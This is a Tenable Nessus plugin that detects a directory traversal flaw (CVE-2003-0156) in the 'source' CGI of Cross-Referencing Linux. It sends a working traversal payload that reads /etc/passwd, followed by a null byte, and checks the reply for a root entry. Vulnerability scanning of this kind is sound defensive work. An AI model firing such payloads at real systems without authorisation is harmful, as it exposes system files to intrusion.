#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(11368);
 script_cve_id("CVE-2003-0156");
 script_bugtraq_id(7062);
 script_xref(name:"OSVDB", value:"8930");
 
 script_version ("$Revision: 1.15 $");
 
 script_name(english:"Cross-Referencing Linux (lxr) CGI v Parameter Traversal Arbitrary File Access");
 script_summary(english:"Checks for the presence of /cgi-bin/source");

 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application running on the remote host has a directory\n",
     "traversal vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "Cross-Referencing Linux appaers to be installed on the remote host.\n",
     "There is a directory traversal vulnerability in the 'v' parameter\n",
     "of the 'source' CGI.  A remote attacker could exploit this to read\n",
     "arbitrary files on the system. "
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2003-03/0151.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Remove this CGI from the system."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
 );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

foreach d (make_list(cgi_dirs()))
{
 url = string(d, "/source?v=../../../../../../../../../../etc/passwd%00");
 res = http_send_recv3(method:"GET", item:url, port:port);
 if(isnull(res)) exit(0);
 if(egrep(pattern:"root:.*:0:[01]:", string:res[2])){
 	security_warning(port);
	exit(0);
	}	
}

